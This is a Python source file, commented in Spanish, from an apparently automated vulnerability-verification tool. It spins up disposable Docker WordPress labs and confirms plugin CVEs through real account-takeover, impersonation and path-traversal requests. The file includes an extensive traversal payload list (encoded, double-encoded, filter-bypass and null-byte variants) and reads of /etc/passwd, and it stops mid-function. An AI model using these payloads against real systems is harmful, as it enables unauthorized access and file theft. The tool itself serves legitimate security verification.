def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: WpVerifyResult,
                   t0: float, budget_s: float,
                   setup_wp_options: Optional[list] = None) -> Optional[_LabSession]:
    """Pasos 1-4 compartidos (ver _LabSession). Devuelve None si algo falla, con `res` ya relleno
    (detail/logs/limitations) -- el caller solo tiene que `return res` sin mas logica.

    `setup_wp_options`, si se da, es una lista de {"name": ..., "value": ...} -- opciones de
    WordPress/del plugin que hay que activar ANTES de probar el ataque para que el codigo
    vulnerable se llegue siquiera a ejecutar (confirmado en vivo con CVE-2024-1071: el SQLi real
    esta en la clase que solo se usa cuando el plugin tiene activada la opcion 'tabla personalizada
    para usermeta' -- con la configuracion de fabrica, el codigo vulnerable nunca se alcanzaba, asi
    que ninguna tecnica de deteccion podia encontrar nada por mucho que probara. Viene de que el
    LLM lea el codigo real alrededor de la funcion vulnerable confirmada (ver
    _refine_web_hints_from_source en cve_agent.py) -- no es un fallback generico, es la misma idea
    de 'leer el codigo real en vez de adivinar' ya aplicada a endpoint/parametros, extendida a
    los REQUISITOS para llegar a ese codigo."""
    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
    admin_user, admin_pass = "binoracle_admin", secrets.token_urlsafe(12)
    sub_user, sub_pass = "binoracle_subscriber", secrets.token_urlsafe(12)
    shots: List[dict] = []
    ctx = {}

    def capture(sess_, url_path, es_caption, en_caption):
        if "base_url" not in ctx:
            return
        png = _screenshot_authenticated(ctx["base_url"], sess_, url_path)
        if png:
            shots.append({"caption_es": es_caption, "caption_en": en_caption, "png_b64": png,
                         "url": ctx["base_url"] + url_path})

    step("levantando laboratorio WordPress+MySQL aislado en Docker (red/volumen propios)...")
    lab.setup_network_and_volume()
    lab.start_mysql(root_pw, db_pw)
    if not lab.mysql_ready(db_pw):
        res.detail = "MySQL no respondio a tiempo"
        res.logs.append("docker logs (mysql):\n" + lab.logs_tail(lab.mysql))
        return None
    step("MySQL listo; arrancando WordPress...")
    port = lab.start_wordpress(db_pw)
    if not port:
        res.detail = "no se pudo publicar el puerto de WordPress"
        res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
        return None
    if not lab.http_ready(port):
        res.detail = "WordPress no respondio a tiempo"
        res.logs.append("docker logs (wordpress):\n" + lab.logs_tail(lab.wp))
        return None
    base_url = f"http://{_lab_host()}:{port}"
    ctx["base_url"] = base_url
    step(f"WordPress listo en {base_url}; instalando core via wp-cli...")

    r = lab.wp_cli("core", "install", f"--url={base_url}", "--title=binoracle-lab",
                   f"--admin_user={admin_user}", f"--admin_password={admin_pass}",
                   "--admin_email=admin@binoracle-lab.invalid", "--skip-email", timeout=90)
    if r.returncode != 0:
        res.detail = f"wp core install fallo: {(r.stderr or r.stdout or '')[:300]}"
        return None
    admin_id = lab.wp_cli("user", "get", admin_user, "--field=ID", timeout=30).stdout.strip()
    step(f"WordPress instalado; admin id={admin_id}")
    step("capturando pantalla: WordPress recien instalado y en pie (laboratorio en vivo)...")
    import requests as _requests
    capture(_requests.Session(), "/wp-login.php",
           "Paso 1: WordPress recien instalado y accesible (laboratorio en vivo, antes de "
           "tocar nada).",
           "Step 1: WordPress freshly installed and reachable (live lab, before anything "
           "is touched).")

    step(f"copiando el plugin ({slug}) al volumen e instalandolo...")
    if not lab.install_plugin(plugin_source_dir, slug):
        res.detail = "no se pudo copiar el plugin al laboratorio"
        return None
    r = lab.wp_cli("plugin", "activate", slug, timeout=60)
    if r.returncode != 0:
        res.detail = f"activacion del plugin fallo: {(r.stderr or r.stdout or '')[:300]}"
        res.limitations.append("si el slug/version descargados no coinciden con el afectado, "
                               "la activacion puede fallar por requisitos del propio plugin")
        return None
    if setup_wp_options:
        for opt in setup_wp_options:
            name = (opt or {}).get("name") if isinstance(opt, dict) else None
            if not name:
                continue
            value = (opt or {}).get("value", "1")
            step(f"activando opcion requerida '{name}'={value!r} (el codigo vulnerable solo se "
                 f"usa con esta activada)...")
            r_opt = lab.wp_cli("option", "update", name, str(value), timeout=30)
            if r_opt.returncode != 0:
                res.limitations.append(
                    f"no se pudo activar la opcion requerida '{name}': "
                    f"{(r_opt.stderr or r_opt.stdout or '')[:200]} -- el ataque puede no "
                    f"alcanzar el codigo vulnerable")

    step("plugin activo. capturando pantalla: panel de plugins como admin (el plugin "
         "vulnerable, activo)...")
    admin_sess = _wp_login(base_url, admin_user, admin_pass, on_step=step)
    if admin_sess is not None:
        capture(admin_sess, "/wp-admin/plugins.php",
               f"Paso 2: el plugin '{slug}' instalado y ACTIVO en el laboratorio (vista del "
               f"admin, con su password ORIGINAL -- antes del ataque).",
               f"Step 2: plugin '{slug}' installed and ACTIVE in the lab (admin's view, with "
               f"their ORIGINAL password -- before the attack).")
    step("Creando el usuario de bajo privilegio (subscriber)...")

    r = lab.wp_cli("user", "create", sub_user, "subscriber@binoracle-lab.invalid",
                   "--role=subscriber", f"--user_pass={sub_pass}", timeout=30)
    if r.returncode != 0:
        res.detail = f"creacion del subscriber fallo: {(r.stderr or r.stdout or '')[:300]}"
        return None
    step("capturando pantalla: usuario de bajo privilegio creado de verdad (lista de "
         "usuarios, vista admin)...")
    if admin_sess is not None:
        capture(admin_sess, "/wp-admin/users.php",
               f"Paso 3: cuenta '{sub_user}' creada de verdad con rol Subscriber (vista de "
               f"la lista de usuarios del admin) -- el unico acceso que tiene el atacante "
               f"antes de explotar nada.",
               f"Step 3: account '{sub_user}' really created with the Subscriber role (admin's "
               f"user list view) -- the only access the attacker has before exploiting "
               f"anything.")

    if budget_s - (time.time() - t0) < 30:
        res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
        return None

    step(f"iniciando sesion como '{sub_user}' (bajo privilegio)...")
    sess = _wp_login(base_url, sub_user, sub_pass, on_step=step)
    if sess is None:
        res.detail = ("no se pudo iniciar sesion como el usuario de bajo privilegio "
                      "(ver el motivo concreto en los pasos de arriba)")
        return None
    res.logs.append(f"login subscriber: OK ({sub_user})")
    step("capturando pantalla: sesion del atacante ANTES del ataque (bajo privilegio)...")
    capture(sess, "/wp-admin/profile.php",
           f"Paso 4: sesion real como '{sub_user}' (subscriber, bajo privilegio) -- esta "
           f"cuenta es la unica que el atacante controla ANTES del ataque.",
           f"Step 4: real session as '{sub_user}' (subscriber, low-privilege) -- this is the "
           f"only account the attacker controls BEFORE the attack.")

    return _LabSession(lab=lab, base_url=base_url, admin_id=admin_id, admin_user=admin_user,
                       admin_pass=admin_pass, sub_user=sub_user, sub_pass=sub_pass,
                       sub_sess=sess, admin_sess=admin_sess, shots=shots, capture=capture)


def verify_wordpress_account_takeover(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    # 1200s (20 min): en Mac Apple Silicon, mysql:5.7/wordpress no tienen imagen arm64 nativa y
    # corren emulados (linux/amd64) via Docker Desktop -- el arranque de MySQL en la PRIMERA
    # ejecucion puede tardar varios minutos por si solo (ver mysql_ready). 600s se quedaba corto
    # y el laboratorio se desmontaba con MySQL aun inicializando, no realmente colgado.
) -> WpVerifyResult:
    """Levanta WordPress+MySQL en Docker, instala el plugin ya descargado en `plugin_source_dir`
    (debe contener `<slug>/...`), crea un usuario subscriber y un admin, inicia sesion como el
    subscriber y envia la peticion de `endpoint`/`http_method`/`parameters` apuntando al ID del
    admin con un email/password nuevos. `verified=True` SOLO si un login posterior como admin con
    la password nueva funciona de verdad. Siempre desmonta el laboratorio al terminar."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    email_param = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_param = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not id_param or not (email_param or pass_param):
        res.detail = "no se identifico un parametro de ID y de email/password en la hipotesis"
        res.limitations.append("la verificacion de account-takeover necesita saber que parametro "
                               "lleva el ID objetivo y cual el email/password nuevos; afina "
                               "'parameters' en la hipotesis del LLM o pasalos a mano")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        new_email = f"takeover-{_token()}@binoracle-lab.invalid"
        new_pass = secrets.token_urlsafe(12)
        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
        payload[id_param] = boot.admin_id
        if email_param:
            payload[email_param] = new_email
        if pass_param:
            payload[pass_param] = new_pass
        m = (http_method or "POST").upper()
        # evidencia REAL: el payload exacto que se envio de verdad (datos de un laboratorio
        # desechable, no de un objetivo real -- seguro de mostrar tal cual).
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_user": boot.admin_user, "admin_id": boot.admin_id,
            "id_param": id_param, "email_param": email_param or None, "pass_param": pass_param or None,
            "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
        })
        step(f"enviando la peticion {m} {endpoint} dirigida al admin (id={boot.admin_id})...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.logs.append(f"peticion enviada: {resp.status_code}")
            res.evidence["status_code_respuesta"] = resp.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:300]
        except Exception as e:
            res.detail = f"fallo enviando la peticion: {e}"
            return res

        step("confirmando: intentando iniciar sesion como admin con la password nueva..." )
        confirm = _wp_login(boot.base_url, boot.admin_user, new_pass) if pass_param else None
        if confirm is not None:
            res.verified = True
            res.ok = True
            res.detail = (f"ACCOUNT TAKEOVER confirmado: login como '{boot.admin_user}' con la "
                          f"password fijada por la peticion funciono de verdad "
                          f"(admin_id={boot.admin_id})")
            res.evidence["password_nueva_confirmada"] = new_pass
            res.evidence["confirmacion"] = (f"login real como '{boot.admin_user}' con la password "
                                            f"'{new_pass}' funciono (cookie wordpress_logged_in_* "
                                            f"presente tras el POST a wp-login.php)")
            step("VERIFICADO: el login como admin con la password nueva funciono.")
            step("capturando pantalla: panel de WordPress YA como admin, con la password "
                 "fijada por el ataque (prueba final)...")
            boot.capture(confirm, "/wp-admin/",
                   f"Paso 5: ACCOUNT TAKEOVER confirmado -- panel de administracion completo de "
                   f"'{boot.admin_user}', accedido con la password que el ataque del paso 4 fijo, "
                   f"no con la password original del admin.",
                   f"Step 5: ACCOUNT TAKEOVER confirmed -- '{boot.admin_user}'s full admin panel, "
                   f"accessed with the password step 4's attack set, not the admin's original "
                   f"password.")
            step("capturando pantalla: la password ORIGINAL del admin ya NO funciona (prueba "
                 "de que el ataque la sobreescribio de verdad)...")
            old_pw_shot = _screenshot_failed_login(boot.base_url, boot.admin_user, boot.admin_pass)
            if old_pw_shot:
                boot.shots.append({
                    "caption_es": (f"Paso 6: intentar entrar como '{boot.admin_user}' con su "
                                   f"password ORIGINAL (la de antes del ataque) ahora FALLA -- "
                                   f"WordPress rechaza el formulario real de login, prueba de que "
                                   f"la password se sobreescribio de verdad, no que haya dos "
                                   f"validas."),
                    "caption_en": (f"Step 6: logging in as '{boot.admin_user}' with their "
                                   f"ORIGINAL password (from before the attack) now FAILS -- "
                                   f"WordPress rejects the real login form, proof the password "
                                   f"was really overwritten, not that two passwords are now "
                                   f"valid."),
                    "png_b64": old_pw_shot, "url": boot.base_url + "/wp-login.php",
                })
            res.evidence["screenshots"] = boot.shots
            return res

        # si no hay pass_param (solo email, p.ej.), confirma por wp-cli leyendo el email actual
        if email_param and not pass_param:
            cur = lab.wp_cli("user", "get", boot.admin_id, "--field=user_email",
                             timeout=20).stdout.strip()
            res.ok = True
            res.verified = (cur == new_email)
            res.evidence["email_nuevo_confirmado"] = new_email
            res.evidence["email_leido_tras_ataque"] = cur
            res.detail = (f"email del admin tras la peticion: {cur!r} "
                          f"(esperado: {new_email!r}) -> {'COINCIDE' if res.verified else 'no coincide'}")
            res.evidence["screenshots"] = boot.shots
            return res

        res.ok = True
        res.detail = "la peticion se envio pero no se pudo confirmar el efecto (login posterior fallo)"
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_direct_login_as(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", confirm_path: str = "/wp-admin/users.php",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica la OTRA forma de account-takeover por missing-authorization: un plugin cuya accion
    deja a un usuario de bajo privilegio CONVERTIRSE directamente en la sesion de otro usuario
    ("login as", p.ej. CVE-2024-43982 en Login As Users: `gwslau_login_as_user_action()` sin
    comprobacion de capability), en vez de cambiar una credencial. Aqui NO hay password nueva que
    confirmar por un segundo login (ver verify_wordpress_account_takeover() para ese otro caso);
    la confirmacion principal es, con la MISMA sesion del atacante (sin re-loguearse): esa sesion,
    que antes de la peticion NO podia ver `confirm_path` (pagina solo-admin), ahora SI la ve de
    verdad (HTTP 200, sin redirigir a wp-login.php y sin el mensaje de WordPress de 'no tienes
    permiso') -- ya se confirmo justo antes que esa misma pagina estaba denegada, asi que esta
    transicion por si sola es prueba fuerte. Se registra TAMBIEN si alguna cookie de la sesion
    cambio (evidencia de apoyo, no un requisito): distintos plugins suplantan de formas distintas
    -- algunos reemplazan la cookie de auth de WordPress (wordpress_logged_in_*), otros (como
    Login As Users, CVE-2024-43982: gwslau_login_as_user_action() guarda el ID en $_SESSION de PHP
    y lo aplica en cada peticion via el hook 'init') ni tocan esa cookie, solo la sesion nativa de
    PHP -- exigir el cambio de UNA cookie concreta habria dado un falso negativo contra ese CVE
    real (confirmado probando contra el plugin de verdad).
    Limitacion conocida: si el endpoint real exige un nonce de WordPress (`_wpnonce`) que no esta
    entre `parameters`, la peticion fallara con ese nonce invalido -- hay que raspar el nonce del
    HTML de la pagina que lo genera y pasarlo en `parameters` (trabajo futuro: hacerlo aqui
    automaticamente). Siempre desmonta el laboratorio al terminar."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    if not id_param:
        res.detail = "no se identifico el parametro que lleva el ID del usuario objetivo"
        res.limitations.append("la verificacion de login-as necesita saber que parametro lleva "
                               "el ID del usuario a suplantar; afina 'parameters' en la hipotesis "
                               "del LLM o pasalo a mano (id_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        # confirma que, ANTES del ataque, la sesion del subscriber NO puede ver la pagina
        # solo-admin -- sin esto, un confirm_path mal elegido (accesible por cualquiera) daria un
        # falso VERIFICADO.
        pre_resp = boot.sub_sess.get(boot.base_url + confirm_path, timeout=15,
                                     allow_redirects=True)
        pre_denied = (pre_resp.status_code != 200 or "wp-login.php" in pre_resp.url
                     or "do not have sufficient permissions" in pre_resp.text.lower()
                     or "sorry, you are not allowed" in pre_resp.text.lower())
        if not pre_denied:
            res.detail = (f"{confirm_path} ya era visible para el subscriber ANTES del ataque -- "
                          f"no sirve como confirmacion (prueba otra pagina solo-admin)")
            res.limitations.append("confirm_path debe ser una pagina que un subscriber normal NO "
                                   "pueda ver; con el valor dado no distingue nada")
            return res

        # TODAS las cookies, no solo wordpress_logged_in_*: distintos plugins suplantan por vias
        # distintas (ver docstring) -- esto es evidencia de apoyo, no el criterio de VERIFICADO.
        cookie_before = {c.name: c.value for c in boot.sub_sess.cookies}
        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
        payload[id_param] = boot.admin_id
        m = (http_method or "GET").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_user": boot.admin_user, "admin_id": boot.admin_id, "id_param": id_param,
            "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
        })
        step(f"enviando la peticion {m} {endpoint} (login-as) dirigida al admin "
             f"(id={boot.admin_id})...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.logs.append(f"peticion enviada: {resp.status_code}")
            res.evidence["status_code_respuesta"] = resp.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:300]
        except Exception as e:
            res.detail = f"fallo enviando la peticion: {e}"
            return res

        cookie_after = {c.name: c.value for c in boot.sub_sess.cookies}
        cookie_changed = cookie_before != cookie_after
        res.evidence["cookie_sesion_cambio"] = cookie_changed
        step("confirmando: la MISMA sesion del atacante, sin volver a loguearse, intenta ver "
             f"{confirm_path} (solo-admin)...")
        post_resp = boot.sub_sess.get(boot.base_url + confirm_path, timeout=15, allow_redirects=True)
        post_ok = (post_resp.status_code == 200 and "wp-login.php" not in post_resp.url
                  and "do not have sufficient permissions" not in post_resp.text.lower()
                  and "sorry, you are not allowed" not in post_resp.text.lower())
        res.evidence["confirm_path"] = confirm_path
        res.evidence["confirm_status_code"] = post_resp.status_code
        if post_ok:
            res.verified = True
            res.ok = True
            res.detail = (f"LOGIN-AS confirmado: la sesion de '{boot.sub_user}' (subscriber), que "
                          f"segundos antes NO podia ver '{confirm_path}', paso a tener acceso real "
                          f"tras la peticion -- SIN volver a loguearse (admin_id={boot.admin_id})")
            res.evidence["confirmacion"] = (f"la misma requests.Session, sin re-login, paso de "
                                            f"'denegado' a '200 OK' en {confirm_path}"
                                            + (" (y alguna cookie de la sesion cambio tras la "
                                               "peticion, evidencia de apoyo)" if cookie_changed
                                               else " (sin cambio de cookie detectable -- este "
                                               "plugin suplanta por otra via, p.ej. sesion nativa "
                                               "de PHP en vez de la cookie de auth de WordPress)"))
            step("VERIFICADO: la sesion del atacante ahora tiene acceso de administrador.")
            step("capturando pantalla: la MISMA sesion, ahora con acceso de administrador "
                 "(prueba final)...")
            boot.capture(boot.sub_sess, confirm_path,
                   f"Paso 5: LOGIN-AS confirmado -- la sesion de '{boot.sub_user}' (que antes del "
                   f"ataque no podia ver esta pagina) ahora accede a '{confirm_path}' sin haberse "
                   f"vuelto a loguear.",
                   f"Step 5: LOGIN-AS confirmed -- '{boot.sub_user}'s session (which could not see "
                   f"this page before the attack) now accesses '{confirm_path}' without logging "
                   f"in again.")
        else:
            res.ok = True
            res.detail = (f"la peticion se envio (status {resp.status_code}) pero {confirm_path} "
                          f"sigue denegado despues -- el login-as no se confirmo. Si el endpoint "
                          f"real exige un _wpnonce, incluyelo en 'parameters' (ver limitacion en "
                          f"el docstring de esta funcion)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


_HTML_FOLLOWABLE_RE = re.compile(r'(?:src|href)\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE)


def _extract_followable_urls(text: str, base_url: str = "") -> List[str]:
    """Candidatas a URL donde un endpoint pudo haber COPIADO el fichero objetivo en vez de
    reflejar su contenido en esta misma respuesta. Confirmado en vivo (CVE-2024-50508,
    Woocommerce Product Design): el manejador vulnerable no devuelve el contenido leido -- copia
    el fichero objetivo a una ruta publica nueva y devuelve DONDE quedo ({"url": "...",
    "path": "...", "status": "success"}) -- hay que pedir esa URL aparte para ver el secreto
    plantado de verdad.

    Dos formas reconocidas: JSON con una clave 'url'/'file_url'/'link' (el caso confirmado en
    vivo), o HTML con un <img src=...>/<a href=...> apuntando a donde quedo la copia (una pagina
    de confirmacion en vez de JSON). Devuelve una LISTA (puede tener varias candidatas en el caso
    HTML, una pagina normal trae muchos src/href de CSS/JS/iconos que no tienen nada que ver) --
    se prueban EN ORDEN hasta encontrar el secreto, igual que ya se prueban en orden las distintas
    profundidades de '../', en vez de asumir que la primera coincidencia es la correcta."""
    try:
        data = json.loads(text or "")
    except Exception:
        data = None
    if isinstance(data, dict):
        urls = []
        for key in ("url", "file_url", "link"):
            v = data.get(key)
            if isinstance(v, str) and v.startswith(("http://", "https://")):
                urls.append(v)
        return urls
    if not text:
        return []
    from urllib.parse import urljoin
    candidates = []
    for m in _HTML_FOLLOWABLE_RE.finditer(text):
        href = m.group(1)
        if href.startswith(("http://", "https://")):
            candidates.append(href)
        elif base_url and href.startswith("/"):
            candidates.append(urljoin(base_url, href))
    # tope prudente: una pagina HTML normal trae decenas de src/href -- sin esto, seguir cada
    # enlace de la pagina por cada intento de payload dispararia cientos de peticiones extra.
    return candidates[:10]


def verify_wordpress_path_traversal(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, path_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica path-traversal/LFI: planta un fichero CANARIO con un secreto aleatorio en una ruta
    del sistema de ficheros REAL del contenedor Apache (fuera del volumen /var/www/html, via
    `docker exec` directo -- ver _Lab.write_canary), y confirma que, al pedir esa ruta a traves del
    parametro de fichero/ruta que la hipotesis cita, la respuesta del endpoint devuelve el secreto
    EXACTO. Esto es prueba inequivoca (un secreto de 32 caracteres aleatorios no puede aparecer por
    casualidad), no una deduccion por status code o por el tamano de la respuesta.

    Se prueban varias profundidades de '../' por delante de la ruta absoluta del canario (sin
    saber de antemano cuantos niveles hay entre el directorio base del plugin y la raiz web), ya
    que no se puede leer el codigo para saberlo con certeza en todos los casos; cada intento es una
    peticion real, independiente, registrada en la evidencia. Siempre desmonta el laboratorio."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    if not path_param:
        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
                               "lleva la ruta/nombre de fichero; afina 'parameters' en la "
                               "hipotesis del LLM o pasalo a mano (path_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"propio contenedor, fuera del volumen web)...")
        if not boot.lab.write_canary(canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "path_param": path_param, "canary_path": canary_path, "canary_secret": secret,
            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
        })

        m = (http_method or "GET").upper()
        # varias profundidades de '../': el payload real depende de donde concatena el codigo el
        # parametro, que no podemos saber con certeza sin leer el codigo -- cada intento es una
        # peticion real, no una suposicion que se cuela como si fuera un hecho confirmado.
        rel = canary_path.lstrip("/")
        depths = (2, 4, 6, 8, 10, 12)
        attempts = [rel, canary_path]
        attempts += [("../" * n) + rel for n in depths]
        # variantes de codificacion/filtro (cada una ataca un saneo distinto que un codigo real
        # podria aplicar -- str_replace('../','') naive, basename() que no toca %2e, un WAF que
        # decodifica una sola vez, Windows que acepta backslash, o el null-byte historico de PHP
        # <5.3.4 que trunca la extension que el codigo pudiera anadir):
        attempts += [("..%2f" * n) + rel for n in depths]                      # URL-encoded
        attempts += [("%2e%2e%2f" * n) + rel for n in depths]                  # fully encoded
        attempts += [("%252e%252e%252f" * n) + rel for n in depths]            # double-encoded
        attempts += [("..\\" * n) + rel for n in depths]                       # backslash (Windows)
        attempts += [("....//" * n) + rel for n in depths]                     # bypass str_replace('../','')
        attempts += [rel + "%00", canary_path + "%00"]                         # null-byte legacy
        found = False
        tried = []
        for payload_value in attempts:
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[path_param] = payload_value
            step(f"probando {m} {endpoint} con {path_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            # un recorte corto del cuerpo real (NO solo si/no hay secreto) en CADA intento --
            # confirmado en vivo, CVE-2024-50508: sin esto, un negativo (file_exists()/copy()
            # fallando por permisos, un error de la propia app...) no se puede diagnosticar sin
            # volver a lanzar el ataque a mano o leer el codigo del plugin; con el cuerpo real
            # delante (p.ej. '{"status":"error","message":"File is not moved..."}') se ve al
            # momento si el servidor esta rechazando el intento y por que, en vez de tener que
            # adivinarlo desde fuera.
            tried.append({"payload": payload_value, "status": resp.status_code,
                          "secret_presente": secret in (resp.text or ""),
                          "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
            # patron "copia-y-sirve" (ver _extract_followable_urls): algunos endpoints no
            # reflejan el contenido en ESTA respuesta, copian el fichero a una ruta publica
            # nueva y devuelven DONDE quedo -- hay que pedirla aparte para ver el secreto real.
            # Se prueban todas las candidatas EN ORDEN hasta encontrar el secreto (una pagina
            # HTML normal puede traer varios src/href que no tienen nada que ver).
            followed_resp, follow_url = resp, None
            if secret not in (resp.text or ""):
                for candidate in _extract_followable_urls(resp.text, boot.base_url):
                    try:
                        candidate_resp = boot.sub_sess.request("GET", candidate, timeout=20)
                    except Exception as e:
                        tried[-1].setdefault("followed_url_errors", []).append(
                            {"url": candidate, "error": str(e)})
                        continue
                    if secret in (candidate_resp.text or ""):
                        followed_resp, follow_url = candidate_resp, candidate
                        break
                if follow_url:
                    tried[-1]["followed_url"] = follow_url
                tried[-1]["followed_secret_presente"] = secret in (followed_resp.text or "")
            if secret in (followed_resp.text or ""):
                found = True
                res.evidence["payload_ganador"] = payload_value
                if follow_url:
                    res.evidence["url_seguida"] = follow_url
                res.evidence["status_code_respuesta"] = followed_resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (followed_resp.text or "")[:500]
                step((f"VERIFICADO: el secreto plantado aparecio literal en la respuesta de "
                     f"{follow_url} (la peticion original copio el fichero ahi en vez de "
                     f"devolver el contenido directo)" if follow_url else
                     f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
                     f"{path_param}={payload_value!r}."))
                step("capturando pantalla: la respuesta HTTP con el secreto filtrado (prueba "
                     "final)...")
                shot_url = (boot.base_url + endpoint
                           + ("&" if "?" in endpoint else "?")
                           + f"{path_param}={payload_value}") if (m == "GET" and not follow_url) else None
                if shot_url:
                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                           f"Paso 5: LECTURA DE FICHERO confirmada -- la respuesta real del "
                           f"servidor contiene el secreto plantado en {canary_path}, fuera del "
                           f"directorio web previsto.",
                           f"Step 5: FILE READ confirmed -- the server's real response contains "
                           f"the secret planted at {canary_path}, outside the intended web "
                           f"directory.")
                break
        # ultimo recurso si el canario (en /tmp, fuera del volumen web) no se confirmo: repetir
        # las mismas 40 variantes pero pidiendo literalmente /etc/passwd -- el objetivo EXACTO
        # que demuestra el PoC publico ya divulgado de esta CVE. Universal en cualquier Linux,
        # sin permisos especiales para leerlo (0644, cualquier usuario), asi que si esto SI
        # devuelve la firma inequivoca de /etc/passwd y el canario no, aisla el problema a algo
        # especifico del fichero/ruta del canario (o de como se plantea), no del endpoint en si.
        tried_passwd = []
        if not found:
            step("el canario no se confirmo -- probando tambien con /etc/passwd literal (el "
                 "mismo objetivo que demuestra el PoC publico ya divulgado, para aislar si el "
                 "problema es del canario o del endpoint)...")
            passwd_attempts = ["etc/passwd", "/etc/passwd"]
            passwd_attempts += [("../" * n) + "etc/passwd" for n in depths]
            passwd_attempts += [("..%2f" * n) + "etc/passwd" for n in depths]
            for payload_value in passwd_attempts:
                payload = (dict(parameters) if isinstance(parameters, dict)
                          else {p: "" for p in (parameters or [])})
                payload[path_param] = payload_value
                step(f"probando {m} {endpoint} con {path_param}={payload_value!r} "
                     f"(/etc/passwd)...")
                try:
                    resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                       data=payload if m != "GET" else None,
                                       params=payload if m == "GET" else None, timeout=20)
                except Exception as e:
                    tried_passwd.append({"payload": payload_value, "error": str(e)})
                    continue
                body = resp.text or ""
                followed_body, follow_url = body, None
                if not _PASSWD_SIGNATURE_RE.search(body):
                    for candidate in _extract_followable_urls(body, boot.base_url):
                        try:
                            candidate_resp = boot.sub_sess.request("GET", candidate, timeout=20)
                        except Exception:
                            continue
                        if _PASSWD_SIGNATURE_RE.search(candidate_resp.text or ""):
                            followed_body, follow_url = candidate_resp.text, candidate
                            break
                tried_passwd.append({"payload": payload_value, "status": resp.status_code,
                                     "passwd_signature_presente": bool(
                                         _PASSWD_SIGNATURE_RE.search(followed_body)),
                                     "respuesta_cuerpo_recorte": body[:300]})
                if _PASSWD_SIGNATURE_RE.search(followed_body):
                    found = True
                    res.evidence["payload_ganador"] = payload_value
                    res.evidence["objetivo_ganador"] = "/etc/passwd"
                    if follow_url:
                        res.evidence["url_seguida"] = follow_url
                    res.evidence["respuesta_cuerpo_recorte"] = followed_body[:500]
